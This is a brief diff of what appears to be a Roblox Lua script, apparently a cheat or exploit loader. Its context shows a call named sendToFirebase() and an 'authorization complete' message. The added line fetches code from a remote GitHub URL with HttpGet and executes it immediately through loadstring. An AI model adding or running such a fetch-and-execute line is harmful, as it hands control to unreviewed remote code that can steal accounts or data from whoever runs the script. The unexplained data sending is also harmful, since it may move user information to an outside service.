@@ -118,3 +118,5 @@ end
 sendToFirebase()
 
 print("✅ Authorization complete - Loading main GUI...")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/givenship/Unanchor.euva/refs/heads/main/Main"))()
